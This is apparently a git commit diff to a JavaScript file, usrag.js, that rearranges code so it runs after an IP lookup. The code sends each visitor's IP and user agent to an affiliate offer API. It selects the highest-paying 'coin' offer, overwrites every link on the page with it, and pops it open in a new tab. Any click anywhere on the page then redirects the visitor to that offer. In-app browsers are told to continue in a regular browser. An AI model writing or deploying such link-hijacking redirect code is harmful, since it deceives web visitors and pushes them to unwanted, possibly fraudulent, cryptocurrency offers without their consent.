a49bf2355266996226f0bbf1585039c5264a8543
NikDzub <87159434+NikDzub@users.noreply.github.com>
2024-09-02 11:50:46 +0300

    .

--- usrag.js
+++ usrag.js
@@ -20,69 +20,71 @@ fetch('https://api.ipify.org?format=json')
   })
   .then((data) => {
     ip = data.ip;
+    console.log(ip);
+
+    // GET OFFER
+    const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
+      ip
+    )}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
+    console.log(urlWithParams);
+    fetch(urlWithParams, {
+      method: 'GET', // or 'POST', 'PUT', 'DELETE', etc. depending on your use case
+      headers: {
+        Authorization: `Bearer ${token}`, // Include the Bearer token
+        'Content-Type': 'application/json', // Optional, depending on your API requirements
+      },
+    })
+      .then((response) => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok ' + response.statusText);
+        }
+        return response.json(); // or response.text() if the response is plain text
+      })
+      .then((data) => {
+        const filteredOffers = data.offers.filter((offer) =>
+          offer.name.toLowerCase().includes('coin')
+        );
+
+        const sortedOffers = filteredOffers.sort((a, b) => {
+          const payoutA = parseFloat(a.payout) || 0;
+          const payoutB = parseFloat(b.payout) || 0;
+          return payoutB - payoutA;
+        });
+
+        console.log(sortedOffers[0].link);
+        const links = document.querySelectorAll('a');
+        links.forEach((link) => {
+          link.href = sortedOffers[0].link;
+        });
+
+        if (
+          agent.indexOf('music') == -1 ||
+          agent.indexOf('AppName') == -1 ||
+          agent.indexOf('AppVersion') == -1
+        ) {
+          window.open(sortedOffers[0].link, '_blank').focus();
+        }
+
+        const html_elem = document.querySelector('html');
+        html_elem.addEventListener('click', () => {
+          if (
+            agent.indexOf('music') >= 0 ||
+            agent.indexOf('AppName') >= 0 ||
+            agent.indexOf('AppVersion') >= 0
+          ) {
+            alert('To download, please continue in your browser.');
+          } else {
+            window.location.href = sortedOffers[0].link;
+          }
+        });
+      })
+      .catch((error) => {
+        console.error('There was a problem with the fetch operation:', error);
+      });
+    // GET OFFER
   })
   .catch((error) => {
     console.error('There was a problem with the fetch operation:', error);
   });
 
 // GET IP
-
-// GET OFFER
-const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
-  ip
-)}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
-fetch(urlWithParams, {
-  method: 'GET', // or 'POST', 'PUT', 'DELETE', etc. depending on your use case
-  headers: {
-    Authorization: `Bearer ${token}`, // Include the Bearer token
-    'Content-Type': 'application/json', // Optional, depending on your API requirements
-  },
-})
-  .then((response) => {
-    if (!response.ok) {
-      throw new Error('Network response was not ok ' + response.statusText);
-    }
-    return response.json(); // or response.text() if the response is plain text
-  })
-  .then((data) => {
-    const filteredOffers = data.offers.filter((offer) =>
-      offer.name.toLowerCase().includes('coin')
-    );
-
-    const sortedOffers = filteredOffers.sort((a, b) => {
-      const payoutA = parseFloat(a.payout) || 0;
-      const payoutB = parseFloat(b.payout) || 0;
-      return payoutB - payoutA;
-    });
-
-    console.log(sortedOffers[0].link);
-    const links = document.querySelectorAll('a');
-    links.forEach((link) => {
-      link.href = sortedOffers[0].link;
-    });
-
-    if (
-      agent.indexOf('music') == -1 ||
-      agent.indexOf('AppName') == -1 ||
-      agent.indexOf('AppVersion') == -1
-    ) {
-      window.open(sortedOffers[0].link, '_blank').focus();
-    }
-
-    const html_elem = document.querySelector('html');
-    html_elem.addEventListener('click', () => {
-      if (
-        agent.indexOf('music') >= 0 ||
-        agent.indexOf('AppName') >= 0 ||
-        agent.indexOf('AppVersion') >= 0
-      ) {
-        alert('To download, please continue in your browser.');
-      } else {
-        window.location.href = sortedOffers[0].link;
-      }
-    });
-  })
-  .catch((error) => {
-    console.error('There was a problem with the fetch operation:', error);
-  });
-// GET OFFER
